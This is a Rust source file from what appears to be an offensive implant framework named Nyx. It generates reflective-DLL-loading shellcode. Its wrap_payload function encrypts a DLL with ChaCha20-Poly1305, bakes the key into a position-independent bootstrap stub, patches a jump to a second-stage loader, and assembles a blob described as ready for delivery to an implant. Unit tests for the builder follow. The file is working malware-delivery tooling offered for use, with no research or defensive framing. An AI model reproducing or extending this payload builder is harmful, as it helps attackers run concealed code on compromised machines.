//! Nyx PIC reflective loader stub generator.
//!
//! This is a **host-side** library (std, build host) that generates the
//! shellcode blob for reflective DLL loading. It does NOT run on the implant —
//! it produces the PIC stub + encrypted DLL payload that the implant receives
//! and executes.
//!
//! ## Architecture
//!
//! ```text
//! build host                           target (implant)
//! ──────────                           ────────────────
//! dll_bytes ──► wrap_payload() ──► blob ──► implant receives blob
//!                 │                              │
//!                 ├─ encrypt DLL (ChaCha20-Poly1305)      │
//!                 ├─ prepend loader stub                   ▼
//!                 └─ append LAYER2 (pic-loader)    execute stub
//!                                                         │
//!                                                    stub self-locates
//!                                                    finds NYX2 magic
//!                                                    reads len + nonce
//!                                                    jmp → LAYER2:
//!                                                    decrypts (inline
//!                                                     ChaCha20-Poly1305)
//!                                                    reflectively loads PE
//!                                                    calls DllMain
//! ```
//!
//! ## Payload layout (definitive, spec §5.3)
//!
//! ```text
//! ┌──────────────┬──────────────┬──────────────┬──────────────┬──────────────┐
//! │  LAYER1 +    │   key (32B)  │  NYX2 magic  │ encrypted_len│   ciphertext │
//! │  bridge      │              │   (4 bytes)  │  u32 LE (4B) │  (N bytes)   │
//! ├──────────────┴──────────────┴──────────────┴──────────────┴──────────────┤
//! │  nonce (12B) │            ciphertext        │  Poly1305 tag (16B)        │
//! └──────────────┴──────────────────────────────┴────────────────────────────┘
//! ────────────────────────────► then LAYER2 code (pic-loader) ◄──────────────
//! ```
//!
//! The full blob is `[LAYER1 + bridge][key 32B][header][ct||tag][LAYER2]`:
//!
//!   * **LAYER1 + bridge** — [`on_target::LAYER1_BOOTSTRAP`]: self-location,
//!     bounded NYX2 magic scan, header parse, and the bridge that sets the
//!     pic-loader Win64 entry ABI (`rcx=&key, rdx=&nonce, r8=&ct, r9=ct_len`),
//!     ending in a `jmp rel32` that [`wrap_payload`] patches to the Layer-2
//!     entry.
//!   * **key** — the 32-byte ChaCha20 key, baked in at
//!     [`on_target::KEY_PATCH_OFFSET`] (the bridge derives `&key` as
//!     `header_base - 0x20`).
//!   * **header** — NYX2 magic (4B) + encrypted_len u32 LE (4B) + nonce (12B).
//!     Sits right after LAYER1+bridge+key (~0x68) so the 256-byte scan always
//!     finds it.
//!   * **ct||tag** — ciphertext (N bytes, same length as the DLL) + 16-byte
//!     Poly1305 tag.
//!   * **LAYER2** — [`on_target::LAYER2_CODE`], the raw pic-loader bytes,
//!     appended AFTER the ciphertext so the header stays within the scan
//!     bound. The Layer-1 `jmp` is what reaches it.
//!
//! Total payload size: `LAYER1_BOOTSTRAP.len() + 32 + 20 + N + 16 +
//! LAYER2_CODE.len()` bytes.

pub mod dll_probe;
pub mod on_target;
pub mod peb_walk;
pub mod stub;

use chacha20poly1305::{
    aead::{Aead, KeyInit},
    ChaCha20Poly1305, Nonce,
};
use rand::RngCore;

// Re-export key constants for callers that need to reason about offsets.
pub use on_target::{
    KEY_LEN, KEY_PATCH_OFFSET, LAYER1_BOOTSTRAP, LAYER2_CODE, LAYER2_ENTRY_OFFSET,
    LAYER2_JMP_OFFSET,
};
pub use stub::{
    reflective_load, reflective_load_at, ImportResolver, MappedImage, ReflectiveLoadError,
    CIPHERTEXT_OFFSET, ENCRYPTED_LEN_OFFSET, NONCE_OFFSET, NYX2_MAGIC, PIC_STUB_LEN, TAG_LEN,
};

// ── LoaderConfig ────────────────────────────────────────────────────────

/// Configuration for generating a reflective loader payload.
///
/// Holds the encryption key (32 bytes) and nonce (12 bytes) used to protect
/// the embedded DLL. If you call [`LoaderConfig::random`], both are filled
/// from the OS CSPRNG — the caller is responsible for exfiltrating them (e.g.
/// baking them into a per-implant config so the PIC stub can decrypt).
#[derive(Clone, Debug)]
pub struct LoaderConfig {
    /// ChaCha20-Poly1305 encryption key (32 bytes).
    pub key: [u8; 32],
    /// ChaCha20-Poly1305 nonce (12 bytes).
    pub nonce: [u8; 12],
}

impl LoaderConfig {
    /// Create a `LoaderConfig` with the given key and nonce.
    pub fn new(key: [u8; 32], nonce: [u8; 12]) -> Self {
        Self { key, nonce }
    }

    /// Generate a random key + nonce from the OS CSPRNG.
    ///
    /// The caller MUST persist these values somewhere the PIC stub can access
    /// (e.g. baked into per-implant config), otherwise the implant will be
    /// unable to decrypt the embedded DLL.
    pub fn random() -> Self {
        let mut key = [0u8; 32];
        let mut nonce = [0u8; 12];
        rand::rngs::OsRng.fill_bytes(&mut key);
        rand::rngs::OsRng.fill_bytes(&mut nonce);
        Self { key, nonce }
    }
}

// ── Public API ──────────────────────────────────────────────────────────

/// Errors produced by the loader-stub emitter.
#[derive(Clone, Debug, PartialEq, Eq)]
pub enum LoaderError {
    /// The 32-byte ChaCha20 key would make the Layer-1 scan self-match. The
    /// scan cursor starts inside the stub and walks forward over
    /// `LAYER1 + key` before reaching the real header; a magic window
    /// anywhere in the emitted stub (only the key can contribute one —
    /// `LAYER1_BOOTSTRAP` is pinned by test and its zero trailing bytes
    /// cannot complete a window with the key's first bytes) makes the
    /// scanner stop early and parse garbage as the header. Probability
    /// ~2^-29 for a random key; regenerate the key.
    KeyContainsMagic,
}

impl core::fmt::Display for LoaderError {
    fn fmt(&self, f: &mut core::fmt::Formatter<'_>) -> core::fmt::Result {
        match self {
            Self::KeyContainsMagic => write!(
                f,
                "the 32-byte ChaCha20 key contains the NYX2 magic (0x3258594E) as a \
                 contiguous 4-byte window; the Layer-1 scan would self-match inside the \
                 key slot and parse garbage as the NYX2 header — regenerate the key"
            ),
        }
    }
}

impl std::error::Error for LoaderError {}

/// Emit the raw position-independent x86-64 loader stub for `config`.
///
/// The returned stub is the fixed per-config prefix of the full NYX2 blob:
///
/// ```text
/// [LAYER1 + bridge (self-locate + scan + header parse + Win64 ABI bridge
///                   + jmp rel32 placeholder)][key 32B]
/// ```
///
/// Layer 1 is [`on_target::LAYER1_BOOTSTRAP`] verbatim; the 32-byte
/// `config.key` is baked in at [`on_target::KEY_PATCH_OFFSET`]
/// (= `LAYER1_BOOTSTRAP.len()`), where the bridge's `lea rcx, [rbx-0x20]`
/// expects it. The 12-byte `config.nonce` is NOT baked in here — it travels
/// in the NYX2 header that [`wrap_payload`] appends, so the same stub can be
/// re-used with different nonces.
///
/// The `jmp rel32` at [`on_target::LAYER2_JMP_OFFSET`] is left with its
/// zero placeholder here: Layer 2 ([`on_target::LAYER2_CODE`]) sits AFTER the
/// ciphertext in the wrapped payload, so its displacement depends on the DLL
/// length and is patched by [`wrap_payload`].
///
/// # Errors
///
/// Returns [`LoaderError::KeyContainsMagic`] if `config.key` would make the
/// Layer-1 scanner self-match (see the variant docs).
pub fn generate_loader_stub(config: &LoaderConfig) -> Result<Vec<u8>, LoaderError> {
    let mut stub = Vec::with_capacity(LAYER1_BOOTSTRAP.len() + KEY_LEN);
    stub.extend_from_slice(LAYER1_BOOTSTRAP);
    stub.extend_from_slice(&config.key);

    // The scan cursor starts at offset 5 inside the stub and walks forward
    // over LAYER1 + key looking for the magic. LAYER1 is pinned by test to
    // have no magic window, so the only caller-controlled risk is the key;
    // check the emitted stub anyway so a future LAYER1 edit cannot silently
    // reintroduce a self-match. A magic window before the real header would
    // make the scanner parse garbage as the header (silent decrypt failure).
    if stub
        .windows(4)
        .any(|w| u32::from_le_bytes([w[0], w[1], w[2], w[3]]) == NYX2_MAGIC)
    {
        return Err(LoaderError::KeyContainsMagic);
    }

    Ok(stub)
}

/// Encrypt a DLL, prepend the loader stub, and assemble the full NYX2 payload.
///
/// # Layout (definitive, spec §5.3)
///
/// ```text
/// [LAYER1 + bridge][key 32B][NYX2 magic (4B)][encrypted_len u32 LE (4B)]
/// [nonce (12B)][ciphertext (N bytes)][Poly1305 tag (16B)][LAYER2 code]
/// ```
///
/// The stub is the per-config output of [`generate_loader_stub`] — Layer 1 +
/// bridge with `config.key` baked in. `config.nonce` is carried in the NYX2
/// header (so the same stub template can be re-used with different nonces);
/// the inline ChaCha20-Poly1305 routine in Layer 2 reads it from there at
/// runtime.
///
/// Layer 2 ([`on_target::LAYER2_CODE`]) is appended AFTER the ciphertext so
/// the header stays within the Layer-1 256-byte scan bound; the `jmp rel32`
/// inside Layer 1 is patched to land on `LAYER2_CODE + LAYER2_ENTRY_OFFSET`.
///
/// # Arguments
///
/// * `dll_bytes` — the raw PE DLL to encrypt and wrap.
/// * `config` — the key and nonce for ChaCha20-Poly1305 encryption. The key
///   is baked into the emitted stub AND used to encrypt the DLL; the nonce is
///   placed in the NYX2 header AND used to encrypt (so the same nonce is read
///   by both the host-side encrypt and the on-target decrypt).
///
/// # Returns
///
/// The complete payload blob, ready to be delivered to the implant as
/// shellcode: `[LAYER1 + bridge][key][header][ct||tag][LAYER2]`. The only
/// error is [`LoaderError::KeyContainsMagic`] (propagated from
/// [`generate_loader_stub`]).
pub fn wrap_payload(dll_bytes: &[u8], config: &LoaderConfig) -> Result<Vec<u8>, LoaderError> {
    // 0. Emit the stub (LAYER1 + bridge + key slot). The Layer-2 jmp
    //    displacement is patched below once the ciphertext length is known.
    let mut stub = generate_loader_stub(config)?;

    // 1. Encrypt the DLL with ChaCha20-Poly1305. The on-target inline decrypt
    //    routine uses the SAME (key, nonce) — key from the stub, nonce from
    //    the NYX2 header — so the ciphertext this produces is exactly what
    //    Layer 2 will turn back into the plaintext PE.
    let cipher = ChaCha20Poly1305::new_from_slice(&config.key)
        .expect("ChaCha20Poly1305 key is always 32 bytes");
    let nonce = Nonce::from_slice(&config.nonce);
    let ciphertext = cipher
        .encrypt(nonce, dll_bytes)
        .expect("ChaCha20-Poly1305 encrypt is infallible");

    // ciphertext = plaintext || 16-byte Poly1305 tag
    // encrypted_len = dll_bytes.len() (ciphertext portion, excluding tag)
    let encrypted_len = dll_bytes.len() as u32;

    // 2. Patch the Layer-1 jmp to land on the Layer-2 entry. LAYER2 sits
    //    right after ct||tag, so its absolute offset depends on the DLL
    //    length — only known here, not in generate_loader_stub.
    let layer2_start = stub.len() + CIPHERTEXT_OFFSET + ciphertext.len();
    let jmp_end = LAYER2_JMP_OFFSET + 5; // jmp rel32 is the last instruction of LAYER1
    let jmp_target = layer2_start + LAYER2_ENTRY_OFFSET;
    let disp =
        i32::try_from(jmp_target - jmp_end).expect("payload is far below the 2 GiB rel32 limit");
    stub[LAYER2_JMP_OFFSET + 1..LAYER2_JMP_OFFSET + 5].copy_from_slice(&disp.to_le_bytes());

    // 3. Assemble: stub + NYX2 header + ciphertext (incl. tag) + LAYER2.
    let mut payload = Vec::with_capacity(layer2_start + LAYER2_CODE.len());
    payload.extend_from_slice(&stub);

    // NYX2 magic (4 bytes, little-endian)
    payload.extend_from_slice(&NYX2_MAGIC.to_le_bytes());

    // encrypted_len (4 bytes, little-endian)
    payload.extend_from_slice(&encrypted_len.to_le_bytes());

    // nonce (12 bytes)
    payload.extend_from_slice(&config.nonce);

    // ciphertext || Poly1305 tag
    payload.extend_from_slice(&ciphertext);

    // Layer 2 (pic-loader PIC shellcode)
    payload.extend_from_slice(LAYER2_CODE);

    Ok(payload)
}

// ── Tests ───────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    /// A minimal valid PE DLL header for testing (the stub doesn't parse it
    /// yet, but `wrap_payload` encrypts arbitrary bytes).
    fn dummy_dll() -> Vec<u8> {
        // Minimal PE: MZ header + PE signature + empty sections.
        // Just enough bytes to exercise the encrypt/wrap path.
        let mut dll = Vec::new();
        // MZ magic
        dll.extend_from_slice(b"MZ");
        // Padding to make a non-trivial test payload
        dll.extend_from_slice(&[0u8; 62]);
        // PE signature at offset 0x40
        dll.extend_from_slice(b"PE\0\0");
        // Padding
        dll.extend_from_slice(&[0u8; 128]);
        dll
    }

    /// `generate_loader_stub` emits the definitive stub: `LAYER1_BOOTSTRAP`
    /// verbatim followed by the 32-byte key slot at [`KEY_PATCH_OFFSET`].
    #[test]
    fn generate_loader_stub_emits_layer1_plus_key() {
        let key = [0x42u8; 32];
        let nonce = [0x33u8; 12];
        let config = LoaderConfig::new(key, nonce);
        let stub = generate_loader_stub(&config).expect("stub emission must succeed");
        assert_eq!(
            &stub[..LAYER1_BOOTSTRAP.len()],
            LAYER1_BOOTSTRAP,
            "stub must start with LAYER1_BOOTSTRAP verbatim"
        );
        assert_eq!(KEY_PATCH_OFFSET, LAYER1_BOOTSTRAP.len());
        assert_eq!(
            &stub[KEY_PATCH_OFFSET..KEY_PATCH_OFFSET + KEY_LEN],
            &key[..],
            "the 32-byte key must be baked in at KEY_PATCH_OFFSET"
        );
        assert_eq!(stub.len(), LAYER1_BOOTSTRAP.len() + KEY_LEN);
    }

    /// A key whose bytes spell the NYX2 magic as a contiguous window must be
    /// rejected: the Layer-1 scan would self-match inside the key slot and
    /// parse garbage as the header.
    #[test]
    fn generate_loader_stub_rejects_key_containing_magic() {
        let mut key = [0x11u8; 32];
        key[8..12].copy_from_slice(&NYX2_MAGIC.to_le_bytes());
        let config = LoaderConfig::new(key, [0x22u8; 12]);
        let err = generate_loader_stub(&config).expect_err("magic-bearing key must be rejected");
        assert_eq!(err, LoaderError::KeyContainsMagic);
        let msg = err.to_string();
        assert!(
            msg.to_lowercase().contains("key") && msg.contains("0x3258594E"),
            "error must explain the key/magic clash, got: {msg}"
        );
    }

    /// `wrap_payload` emits the full definitive blob and propagates stub
    /// errors (the magic-bearing key is caught before any encryption).
    #[test]
    fn wrap_payload_propagates_key_validation_error() {
        let mut key = [0x01u8; 32];
        key[0..4].copy_from_slice(&NYX2_MAGIC.to_le_bytes());
        let config = LoaderConfig::new(key, [0x02u8; 12]);
        let dll = dummy_dll();
        assert_eq!(
            wrap_payload(&dll, &config),
            Err(LoaderError::KeyContainsMagic)
        );
    }

    /// `LoaderError` must be usable through the `std::error::Error` trait
    /// (callers format it alongside other error types).
    #[test]
    fn loader_error_implements_std_error() {
        fn takes_error<E: std::error::Error>(_e: &E) {}
        takes_error(&LoaderError::KeyContainsMagic);
        let _ = format!("{}", LoaderError::KeyContainsMagic);
    }

    #[test]
    fn random_config_produces_different_keys() {
        let c1 = LoaderConfig::random();
        let c2 = LoaderConfig::random();
        // Probability of collision is astronomically low
        assert_ne!(c1.key, c2.key);
    }

    /// `LoaderConfig::new` preserves the key/nonce verbatim (the emitter
    /// contract the pic-loader Layer-2 relies on).
    #[test]
    fn loader_config_new_preserves_key_and_nonce() {
        let key = [0xAAu8; 32];
        let nonce = [0xBBu8; 12];
        let config = LoaderConfig::new(key, nonce);
        assert_eq!(config.key, key);
        assert_eq!(config.nonce, nonce);
    }
}
